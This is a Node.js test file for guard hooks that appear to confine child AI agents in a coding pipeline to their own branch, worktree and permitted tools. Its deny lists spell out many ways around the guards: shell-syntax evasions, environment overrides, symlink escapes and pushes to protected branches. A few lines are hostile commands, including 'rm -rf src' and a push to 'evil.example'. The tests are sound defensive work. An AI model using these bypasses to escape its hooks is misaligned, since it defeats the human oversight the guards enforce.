import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";

const hooks = fileURLToPath(new URL("../../../pipeline/hooks/", import.meta.url));
const { childGitViolation } = await import(join(hooks, "child-git-guard.mjs"));
const { readonlyViolation } = await import(join(hooks, "readonly-guard.mjs"));
const { childMcpViolation } = await import(join(hooks, "child-mcp-guard.mjs"));

const RUN = { base: "dev", branch: "feature/OSI-1--x" };
const git = (command, run = RUN) => childGitViolation(command, run);
const denies = (fn, cases) => {
  for (const c of cases) assert.notEqual(fn(c), null, `expected a denial: ${c}`);
};
const allows = (fn, cases) => {
  for (const c of cases) assert.equal(fn(c), null, `expected no denial: ${c}`);
};

const { MARVIN_PIPELINE_PROTECTED: _inherited, ...cleanEnv } = process.env;

function runHook(file, payload, env = {}) {
  const r = spawnSync(process.execPath, [join(hooks, file)], {
    input: typeof payload === "string" ? payload : JSON.stringify(payload),
    env: { ...cleanEnv, ...env },
    encoding: "utf8",
  });
  return { status: r.status, stderr: r.stderr };
}

// ── B. child-git-guard ──────────────────────────────────────────────────────

test("child git guard denies every bypass the review confirmed", () => {
  denies(git, [
    "git push origin HEAD:refs/heads/dev",
    "git push origin HEAD:main",
    "git push origin HEAD:refs/heads/main",
    "git push -fu origin HEAD",
    "git push -uf origin HEAD",
    "git push --mirror",
    "git push --all origin",
    "git -c remote.origin.push=+HEAD:refs/heads/dev push",
    "git config remote.origin.push +HEAD:refs/heads/dev",
    "git checkout dev --",
    "git checkout -b x origin/dev --",
    "git symbolic-ref HEAD refs/heads/dev",
    "git update-ref refs/heads/dev HEAD",
    "git branch -f dev HEAD",
    "git branch --move x",
    "git config alias.sw switch",
    "env git switch dev",
    "sh -c 'git switch dev'",
    "(git switch dev)",
    "GH_REPO=o/r gh pr merge 3",
    "gh api -X PUT repos/o/r/pulls/3/merge",
    "gh pr ready 3",
  ]);
});

test("child git guard allows the run's own git and gh workflow", () => {
  allows(git, [
    "git push",
    "git push -u origin HEAD",
    "git push origin HEAD:feature/OSI-1--x",
    "git push --set-upstream origin feature/OSI-1--x",
    "git checkout -- src/a.ts",
    "git checkout HEAD~1 -- src/a.ts",
    "git commit -m 'feat: x'",
    "git merge origin/dev",
    "git branch --show-current",
    "git config --get user.name",
    "gh pr create --draft --base dev --title t --body b",
    "gh pr view 3",
  ]);
});

test("pushes are confined to the run branch, and to HEAD while it has no name", () => {
  allows(git, [
    "git push origin",
    "git push -u",
    "git push origin HEAD",
    "git push origin HEAD:refs/heads/feature/OSI-1--x",
    "git push origin feature/OSI-1--x",
    "git push origin refs/heads/feature/OSI-1--x",
    "git push -u --set-upstream origin HEAD",
  ]);
  denies(git, [
    "git push upstream HEAD",
    "git push origin HEAD feature/OSI-1--x",
    "git push origin +HEAD:feature/OSI-1--x",
    "git push origin :feature/OSI-1--x",
    "git push --delete origin feature/OSI-1--x",
    "git push -d origin feature/OSI-1--x",
    "git push --tags",
    "git push origin --tags",
    "git push -o ci.skip origin HEAD",
    "git push --force-with-lease origin HEAD",
    "git push --force",
    "git push -f",
    "git push origin dev",
    "git push origin HEAD:refs/heads/feature/OSI-1--x-evil",
    "git push origin HEAD:feature/OSI-1--x:dev",
    "git push origin HEAD -u",
    "git push --receive-pack=x origin HEAD",
    "git push https://evil.example/x.git HEAD",
  ]);
  const unnamed = (c) => git(c, { base: "dev", branch: "" });
  allows(unnamed, ["git push", "git push -u origin HEAD", "git push origin HEAD"]);
  denies(unnamed, [
    "git push origin HEAD:feature/OSI-1--x",
    "git push origin feature/OSI-1--x",
    'git push origin ""',
    "git push origin HEAD:",
    "git push origin HEAD:refs/heads/",
  ]);
});

test("git config is read-only, checkout restores paths only, branch only lists", () => {
  denies(git, [
    "git config user.name x",
    "git config --unset user.name",
    "git config --add remote.origin.push x",
    "git config --global --edit",
    "git config --get user.name --replace-all x",
    "git config set user.name x",
    "git checkout dev",
    "git checkout",
    "git checkout -B x -- src/a.ts",
    "git checkout --orphan x -- src/a.ts",
    "git checkout --detach -- src/a.ts",
    "git checkout -qb x origin/dev -- src/a.ts",
    "git checkout --pathspec-from-file=x --",
    "git branch x",
    "git branch x origin/dev",
    "git branch -m x",
    "git branch -M x",
    "git branch -d x",
    "git branch -D x",
    "git branch -c x",
    "git branch -C x",
    "git branch --delete x",
    "git branch --force x",
    "git branch --set-upstream-to=origin/dev",
    "git branch -u origin/dev",
    "git branch --unset-upstream",
    "git branch --edit-description",
  ]);
  allows(git, [
    "git config --list",
    "git config -l",
    "git config --get-all remote.origin.url",
    "git config --get-regexp ^remote",
    "git checkout --theirs -- src/a.ts",
    "git checkout dev -- src/a.ts src/b.ts",
    "git branch",
    "git branch --list 'feature/*'",
    "git branch -l",
    "git branch -a",
    "git branch --all",
    "git branch -r",
    "git branch --remotes",
    "git branch -v",
    "git branch -vv",
    "git branch --contains HEAD",
    "git branch --contains=HEAD",
    "git branch --merged dev",
    "git branch --no-merged",
  ]);
});

test("gh is limited to the run's PR and runs, against the run's base", () => {
  denies(git, [
    "gh api user",
    "gh pr merge 3",
    "gh pr ready 3",
    "gh pr comment 3 -b x",
    "gh pr close 3",
    "gh repo delete o/r",
    "gh workflow run x",
    "gh issue create",
    "gh run rerun 5",
    "gh pr",
    "gh --repo o/r pr view 3",
    "gh pr create --title t --body b",
    "gh pr create --base main --title t --body b",
    "gh pr create -B main",
    "gh pr create -Bmain",
    "gh pr create --base=main",
    "gh pr create --base dev --base main",
    "gh pr create --base dev --head dev",
    "gh pr create --base dev -R o/r",
    "gh pr edit 3 --base main",
    "gh pr edit 3 --repo=o/r --title t",
  ]);
  allows(git, [
    "gh pr create --base=dev --head feature/OSI-1--x --fill",
    "gh pr create -B dev --draft --fill",
    "gh pr view 3 --json url -R o/r",
    "gh pr edit 3 --title t",
    "gh pr edit 3 --base dev",
    "gh pr diff 3",
    "gh pr checks 3 --watch",
    "gh pr list --head feature/OSI-1--x",
    "gh run view 5 --log-failed",
    "gh run list",
  ]);
  assert.notEqual(git("gh pr create --base dev --fill", { base: "", branch: "" }), null);
});

test("the git guard cannot be sidestepped through shell syntax", () => {
  denies(git, [
    // separators hook-io leaves joined, and escapes that desynchronise its quote scan
    "git status & git switch dev",
    "git status |& git switch dev",
    'echo \\"; git switch dev',
    "echo $'it\\'s'; git switch dev",
    // comments end at a newline, and only start a comment at a word boundary
    "echo hi # it's\ngit switch dev",
    "echo a\\ #; git switch dev",
    "echo $(true)#; git switch dev",
    // a quoted, escaped or path-qualified command name
    '"git" switch dev',
    "'git' push origin HEAD:main",
    'gi"t" switch dev',
    "g\\it switch dev",
    "\\git push",
    "\\gh pr view 3",
    "git sw\\itch dev",
    "git $'switch' dev",
    "/usr/bin/git switch dev",
    "/opt/homebrew/bin/gh pr merge 3",
    // a command name or subcommand the guard cannot read
    "$G switch dev",
    '"$G" switch dev',
    "${G} switch dev",
    "git $SUB dev",
    "git push origin $REF",
    "git {switch,x} dev",
    "$(printf git) switch dev",
    // command and process substitution, in every quoting context
    'git commit -m "$(git switch dev)"',
    "echo `git switch dev`",
    'echo "`gh pr merge 3`"',
    'echo "$(gh pr merge 3)"',
    "cat <(git switch dev)",
    "x=$(git push origin HEAD:dev)",
    "echo $((1 + $(git switch dev)))",
    'git commit -m "$(cat <<EOF\n$(git switch dev)\nEOF\n)"',
    "cat <<EOF\n$(git switch dev)\nEOF",
    "cat <<EOF\n`git switch dev`\nEOF",
    'git commit -m "$(git switch dev',
    'echo "$(case x in x) git switch dev;; esac)"',
    "echo $((git switch dev) )",
    "git push -u origin HEAD 2>&1; git push origin 2>x HEAD:dev",
    "git push origin 2> HEAD:feature/OSI-1--x HEAD:dev",
    "trap 'git switch dev' EXIT",
    "alias x='git switch dev'",
    // wrappers, interpreters and compound commands
    "timeout 5 git switch dev",
    "nice git switch dev",
    "command git push origin HEAD:dev",
    "exec git switch dev",
    "time git switch dev",
    "nohup gh pr merge 3",
    "find . -exec git switch dev ;",
    "if git switch dev; then :; fi",
    "{ git switch dev; }",
    "! git switch dev",
    "( git switch dev )",
    "for g in git; do $g switch dev; done",
    "echo 'git switch dev' | bash",
    "bash <<'EOF'\ngit switch dev\nEOF",
    "bash -s < script.sh",
    "eval x",
    "xargs echo",
    "X='git switch dev'; sh -c \"$X\"",
    "node -e \"require('child_process').execSync('git switch dev')\"",
    "python3 -c \"import os; os.system('gh pr merge 3')\"",
    "npx -c 'git switch dev'",
    "npm exec -c 'git switch dev'",
  ]);
  allows(git, [
    "git commit -m \"$(cat <<'EOF'\nfeat: stop calling git push and gh pr merge (don't)\n\nCo-Authored-By: x\nEOF\n)\"",
    'git commit -m "fix: don\'t call git switch"',
    "git diff $(git merge-base HEAD origin/dev)",
    'echo "git push --force origin main"',
    "cat > notes.md <<'EOF'\ngit push --force origin main\nEOF",
    "npx vitest run src/lib/git.test.ts",
    "npm test # never git push from here",
    "git push -u origin HEAD 2>&1 | tail -20",
    "git push origin HEAD > /dev/null 2>&1",
    "git branch --show-current 2>/dev/null",
    "git config --get user.name 2>/dev/null",
    'gh pr list --head "$(git branch --show-current)" --json url',
    "echo $((1 + 2))",
    "bash scripts/check.sh < input.txt",
    "git status && git add -A && git commit -m x",
    "git log --oneline -5 2>&1 | tail -5",
    "npm run build",
    "bash scripts/check.sh",
    "sh -c 'npm test'",
  ]);
});

test("the git guard refuses environment and directory overrides", () => {
  denies(git, [
    "git -C ../main push origin HEAD",
    "git -C/tmp status",
    "git --git-dir=../main/.git status",
    "git --work-tree=../main checkout -- src/a.ts",
    "git --exec-path=. status",
    "git --config-env=core.pager=X log",
    "git -p log",
    "git --paginate log",
    "GIT_DIR=../main/.git git status",
    "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.push GIT_CONFIG_VALUE_0=+HEAD:refs/heads/dev git push",
    "export GIT_CONFIG_COUNT=1",
    "HOME=. git push",
    "PATH=.:$PATH git status",
    "GIT_EDITOR='git switch dev #' git commit",
    "env GIT_DIR=x npm test",
    "GH_REPO=o/r gh pr view 3",
    "GH_HOST=evil gh pr create --base dev",
    "cd ../main && git push origin HEAD",
    "pushd ../main; git push",
  ]);
  allows(git, [
    "LANG=C git log -1",
    "GIT_TERMINAL_PROMPT=0 git fetch origin",
    "GIT_PAGER=cat git log -1",
    "GIT_EDITOR=true git merge origin/dev",
    "git --no-pager log -1",
    "git --version",
    "cd src && npm test",
  ]);
});

test("the git guard admits known subcommands only, so an alias cannot hide one", () => {
  denies(git, [
    "git co dev",
    "git sw dev",
    "git stash",
    "git stash push -m x",
    "git stash drop",
    "git stash clear",
    "git remote set-url origin x",
    "git remote add evil x",
    "git fetch origin main:main",
    "git fetch origin +refs/heads/main:refs/heads/main",
    "git fetch --upload-pack='sh -c x' origin",
    "git fetch -u origin",
    "git pull origin dev:dev",
    "git ls-remote --upload-pack=x origin",
    "git rebase -x 'git switch dev' HEAD~1",
    "git rebase origin/dev",
    "git grep -Ocat foo",
    "git grep --open-files-in-pager=cat foo",
    "git tag v1",
    "git notes add -m x",
    "git replace HEAD dev",
    "git submodule update",
    "git bisect run x",
    "git reflog expire --all",
    "git reflog delete HEAD@{1}",
    "git gc --prune=now",
    "git filter-branch",
    "git difftool -x x",
    "git hook run pre-commit",
    "git worktree add ../x",
    "git switch dev",
  ]);
  allows(git, [
    "git fetch",
    "git fetch origin dev",
    "git fetch --all --prune",
    "git pull origin dev",
    "git ls-remote --heads origin",
    "git stash list",
    "git stash show",
    "git remote",
    "git remote -v",
    "git remote get-url origin",
    "git remote show origin",
    "git reset HEAD src/a.ts",
    "git reset --hard origin/dev",
    "git restore src/a.ts",
    "git rev-parse --abbrev-ref HEAD",
    "git add -A",
    "git rm src/a.ts",
    "git mv a.ts b.ts",
    "git grep -n foo",
    "git show HEAD:src/a.ts",
    "git cherry-pick abc123",
    "git revert --no-edit abc123",
    "git reflog",
    "git merge --abort",
    "git status --porcelain --untracked-files=all",
    "git diff dev...HEAD --stat",
    "git log origin/dev..HEAD --oneline",
  ]);
});

test("child-git-guard hook: denies, allows, and fails closed", () => {
  const wt = realpathSync(mkdtempSync(join(tmpdir(), "pipe-")));
  const env = { MARVIN_PIPELINE_BASE: "dev", MARVIN_PIPELINE_BRANCH: "feature/OSI-1--x" };
  const call = (command, cwd = wt, extra = {}) =>
    runHook(
      "child-git-guard.mjs",
      { tool_name: "Bash", tool_input: { command }, cwd },
      { ...env, CLAUDE_PROJECT_DIR: wt, ...extra },
    );
  assert.equal(call("git push origin HEAD:feature/OSI-1--x").status, 0);
  assert.equal(call("npm test").status, 0);
  const denial = call("git push origin HEAD:dev");
  assert.equal(denial.status, 2);
  assert.match(denial.stderr, /^marvin:pipeline:child-git-guard: BLOCKED - /);
  assert.doesNotMatch(denial.stderr, /disable/i);
  assert.equal(
    call("git push origin HEAD:feature/OSI-1--x", wt, { MARVIN_PIPELINE_BRANCH: "" }).status,
    2,
  );
  assert.equal(call("git status", join(wt, ".."), {}).status, 2);
  assert.equal(call("npm test", join(wt, ".."), {}).status, 0);
  mkdirSync(join(wt, "src"));
  symlinkSync("..", join(wt, "src", "up"));
  assert.equal(call(`cd ${wt} && git status`).status, 0);
  assert.equal(call("cd src && git status").status, 0);
  assert.equal(call("cd up && git status", join(wt, "src")).status, 0);
  assert.equal(call("cd up/.. && git status", join(wt, "src")).status, 2);
  assert.equal(call("cd .. && git status").status, 2);
  assert.equal(call("cd src/up/.. && git status").status, 2);
  assert.equal(call("cd src && cd .. && git status").status, 2);
  assert.equal(call("pushd src && git status").status, 2);
  assert.equal(call("cd - && git status").status, 2);
  assert.equal(call("cd $D && git status").status, 2);
  assert.equal(
    runHook("child-git-guard.mjs", { tool_name: "Bash", tool_input: {} }, env).status,
    2,
  );
  assert.equal(runHook("child-git-guard.mjs", "not json", env).status, 2);
  rmSync(wt, { recursive: true, force: true });
});

// ── C. readonly-guard ───────────────────────────────────────────────────────

test("read-only guard closes the write paths the review found", () => {
  denies(readonlyViolation, [
    "git diff --output=src/a.ts",
    "git log -1 --output=src/a.ts",
    "git diff --output src/a.ts",
    "git show --outp=src/a.ts HEAD",
    "git grep -Ocat foo",
    "git grep --open-files-in-pager=cat foo",
    "npm test -- -u",
    "npm run test -- --update",
    "npm run test:unit -- -u",
    "npx vitest -u",
    "npx jest -u",
    "npx jest --updateSnapshot",
    "gh api -XPUT repos/o/r/pulls/5/merge",
    "gh api --method=PUT x",
    "gh api graphql --raw-field=query=x",
    "gh api -fquery=x graphql",
    "gh api --input=body.json repos/o/r/issues",
    "gh api user",
    "echo x>src/a.ts",
    'git diff > "src/a.ts"',
    "git diff &>src/a.ts",
    "git diff >| src/a.ts",
    "git diff >>src/a.ts",
    "git diff >&src/a.ts",
    "git diff 2>src/a.ts",
    "cat a.ts | tee >(cat) ",
    'echo "$(rm -rf src)"',
    "echo `touch src/a.ts`",
    "git status & rm -rf src",
    "FOO=1 rm -rf src",
    "/bin/rm -rf src",
    "sed --in-place s/a/b/ f.ts",
    "if rm -rf src; then :; fi",
  ]);
  allows(readonlyViolation, [
    "git diff dev...HEAD --stat",
    "git diff 2>/dev/null",
    "git diff &>/dev/null",
    "git diff >&2",
    "git diff 2>&1 | head",
    "git log --oneline -5 2>&1 | tail -5",
    "cat a.ts > /dev/null",
    'echo "a > b"',
    "git log --format='%h > %s' -3",
    "npx vitest run src/a.test.ts",
    "npm test -- src/a.test.ts",
    "git diff $(git merge-base HEAD origin/dev)",
    "gh pr view 12 --json state",
  ]);
});

// ── D. child-mcp-guard ──────────────────────────────────────────────────────

test("child MCP guard keeps children off the board, the ADR ledger and the baselines", () => {
  const T = (tool) => `mcp__plugin_marvin_marvin__${tool}`;
  const deny = [
    [T("task"), { action: "list" }, "executor"],
    [T("task"), { action: "config" }, "planner"],
    [T("task"), { action: "archive" }, "executor"],
    [T("task"), { action: "link-pr" }, "executor"],
    [T("task"), {}, "verifier"],
    ["mcp__marvin__task", { action: "show" }, "executor"],
    [T("tracker"), { action: "list" }, "planner"],
    [T("spec"), { action: "seal" }, "executor"],
    [T("spec"), { mode: "seal" }, "executor"],
    [T("spec"), { action: "dor", mode: "seal" }, "test-author"],
    [T("spec"), { action: "seal" }, undefined],
    [T("adr"), { action: "accept" }, "planner"],
    [T("adr"), { action: "supersede" }, "planner"],
    [T("lessons"), { action: "add" }, "retro"],
    [T("lessons"), { action: "prune" }, "retro"],
    [T("verify"), { action: "gate", allowStale: true }, "executor"],
    [T("verify"), { allowStale: "true" }, "executor"],
    [T("report"), { action: "triage", snapshot: true }, "verifier"],
  ];
  for (const [tool, input, role] of deny) {
    assert.notEqual(childMcpViolation(tool, input, role), null, `${tool} ${JSON.stringify(input)}`);
  }
  const allow = [
    [T("spec"), { action: "seal" }, "planner"],
    [T("spec"), { mode: "seal" }, "planner"],
    [T("spec"), { action: "dor" }, "executor"],
    [T("spec"), {}, "executor"],
    [T("spec"), { action: "progress" }, "executor"],
    [T("lessons"), { action: "search", query: "x" }, "executor"],
    [T("lessons"), { action: "stats" }, "retro"],
    [T("verify"), { action: "gate" }, "executor"],
    [T("verify"), { allowStale: false }, "executor"],
    [T("adr"), { action: "list" }, "planner"],
    [T("report"), { action: "triage" }, "verifier"],
    [T("report"), { snapshot: false }, "verifier"],
  ];
  for (const [tool, input, role] of allow) {
    assert.equal(childMcpViolation(tool, input, role), null, `${tool} ${JSON.stringify(input)}`);
  }
});

test("child-mcp-guard hook reads the tool, its input and the role", () => {
  const call = (tool_name, tool_input, role) =>
    runHook("child-mcp-guard.mjs", { tool_name, tool_input }, { MARVIN_PIPELINE_ROLE: role });
  const seal = call("mcp__plugin_marvin_marvin__spec", { action: "seal" }, "executor");
  assert.equal(seal.status, 2);
  assert.match(seal.stderr, /^marvin:pipeline:child-mcp-guard: BLOCKED - /);
  assert.doesNotMatch(seal.stderr, /disable/i);
  assert.equal(call("mcp__plugin_marvin_marvin__spec", { action: "seal" }, "planner").status, 0);
  assert.equal(call("mcp__plugin_marvin_marvin__task", { action: "list" }, "planner").status, 2);
  assert.equal(runHook("child-mcp-guard.mjs", "not json").status, 2);
});

// ── E. worktree-boundary-guard ──────────────────────────────────────────────

function sandbox() {
  const base = mkdtempSync(join(tmpdir(), "pipe-"));
  const main = join(base, "main");
  const wt = join(base, "wt");
  mkdirSync(join(main, "src"), { recursive: true });
  mkdirSync(join(wt, "src"), { recursive: true });
  writeFileSync(join(main, "src", "a.ts"), "// main");
  writeFileSync(join(wt, "src", "a.ts"), "// wt");
  symlinkSync("../main", join(wt, "mainlink"));
  symlinkSync("../../main/src/a.ts", join(wt, "src", "evil.ts"));
  symlinkSync("../../main/src/new.ts", join(wt, "src", "dangling.ts"));
  symlinkSync("../main/src", join(wt, "l2"));
  symlinkSync("l2/..", join(wt, "x"));
  return { base, main, wt };
}

const boundary = (root, tool_input, env = {}, tool_name = "Write") =>
  runHook(
    "worktree-boundary-guard.mjs",
    { tool_name, tool_input },
    { CLAUDE_PROJECT_DIR: root, ...env },
  ).status;

test("the boundary guard follows symlinks out of the worktree", () => {
  const { base, wt } = sandbox();
  const write = (file_path) => boundary(wt, { file_path });
  assert.equal(write(join(wt, "src", "a.ts")), 0);
  assert.equal(write("src/a.ts"), 0);
  assert.equal(write(join(wt, "src", "fresh", "b.ts")), 0);
  assert.equal(write(join(wt, "mainlink", "src", "a.ts")), 2);
  assert.equal(write("mainlink/src/a.ts"), 2);
  assert.equal(write(join(wt, "mainlink", "src", "new.ts")), 2);
  assert.equal(write(join(wt, "src", "evil.ts")), 2);
  assert.equal(write("src/evil.ts"), 2);
  assert.equal(write(join(wt, "src", "dangling.ts")), 2);
  assert.equal(write(join(wt, "x", "a.ts")), 2);
  assert.equal(write(join(wt, "src", "..", "..", "main", "src", "a.ts")), 2);
  assert.equal(write(wt), 2);
  rmSync(base, { recursive: true, force: true });
});

test("a root reached through a symlink compares by its real path", () => {
  const { base, wt } = sandbox();
  const alias = `${base}-alias`;
  symlinkSync(base, alias);
  assert.equal(
    boundary(join(alias, "wt"), { file_path: join(realpathSync(wt), "src", "a.ts") }),
    0,
  );
  assert.equal(boundary(realpathSync(wt), { file_path: join(alias, "wt", "src", "a.ts") }), 0);
  assert.equal(
    boundary(join(alias, "wt"), { file_path: join(realpathSync(base), "main", "src", "a.ts") }),
    2,
  );
  rmSync(alias);
  rmSync(base, { recursive: true, force: true });
});

test(
  "/tmp and /private/tmp name the same worktree",
  { skip: process.platform !== "darwin" },
  () => {
    const base = mkdtempSync("/tmp/pipe-");
    mkdirSync(join(base, "wt", "src"), { recursive: true });
    assert.equal(boundary(join(base, "wt"), { file_path: `/private${base}/wt/src/a.ts` }), 0);
    assert.equal(boundary(`/private${base}/wt`, { file_path: join(base, "wt", "src", "a.ts") }), 0);
    rmSync(base, { recursive: true, force: true });
  },
);

test("protected paths inside the worktree are denied", () => {
  const { base, wt } = sandbox();
  for (const rel of [
    ".marvin/config.json",
    ".marvin/pipeline/run.json",
    ".claude/settings.json",
    ".claude/settings.local.json",
    ".claude/hooks/pre.sh",
    ".husky/pre-commit",
    ".mcp.json",
    ".git",
    ".git/config",
    ".Husky/pre-commit",
  ]) {
    assert.equal(boundary(wt, { file_path: join(wt, rel) }), 2, rel);
  }
  for (const rel of [
    ".marvin/task/1-x.md",
    ".claude/agents/a.md",
    "src/.mcp.json",
    "docs/.husky.md",
    ".github/workflows/ci.yml",
    ".gitignore",
  ]) {
    assert.equal(boundary(wt, { file_path: join(wt, rel) }), 0, rel);
  }
  rmSync(base, { recursive: true, force: true });
});

test("extra protected paths come from MARVIN_PIPELINE_PROTECTED and fail closed", () => {
  const { base, wt } = sandbox();
  const file = (rel) => ({ file_path: join(wt, rel) });
  const env = (value) => ({ MARVIN_PIPELINE_PROTECTED: value });
  assert.equal(boundary(wt, file("secrets/a.txt"), env('["^secrets/"]')), 2);
  assert.equal(boundary(wt, file("src/a.ts"), env('["^secrets/"]')), 0);
  assert.equal(boundary(wt, file(".mcp.json"), env('["^secrets/"]')), 2);
  for (const bad of ["", "[oops", "{}", '"^x"', '["("]', "[1]"]) {
    assert.equal(boundary(wt, file("src/a.ts"), env(bad)), 2, bad);
  }
  rmSync(base, { recursive: true, force: true });
});

test("the boundary guard reads notebook_path and fails closed on a bad payload", () => {
  const { base, wt } = sandbox();
  assert.equal(boundary(wt, { notebook_path: join(wt, "n.ipynb") }, {}, "NotebookEdit"), 0);
  assert.equal(
    boundary(wt, { notebook_path: join(wt, "mainlink", "n.ipynb") }, {}, "NotebookEdit"),
    2,
  );
  assert.equal(
    boundary(wt, { notebook_path: join(wt, ".husky", "n.ipynb") }, {}, "NotebookEdit"),
    2,
  );
  assert.equal(boundary(wt, {}), 2);
  assert.equal(boundary("", { file_path: join(wt, "src", "a.ts") }), 2);
  const denial = runHook(
    "worktree-boundary-guard.mjs",
    { tool_name: "Write", tool_input: { file_path: join(wt, "mainlink", "x") } },
    { CLAUDE_PROJECT_DIR: wt },
  );
  assert.match(denial.stderr, /^marvin:pipeline:worktree-boundary-guard: BLOCKED - /);
  assert.doesNotMatch(denial.stderr, /disable/i);
  rmSync(base, { recursive: true, force: true });
});

// ── F. pipeline denials ─────────────────────────────────────────────────────

test("no pipeline denial advertises the hooks kill switch", () => {
  const readonly = runHook("readonly-guard.mjs", {
    tool_name: "Bash",
    tool_input: { command: "rm -rf src" },
  });
  assert.equal(readonly.status, 2);
  assert.match(readonly.stderr, /^marvin:pipeline:readonly-guard: BLOCKED - /);
  assert.doesNotMatch(readonly.stderr, /disable|MARVIN_HOOKS_DISABLED/i);
});
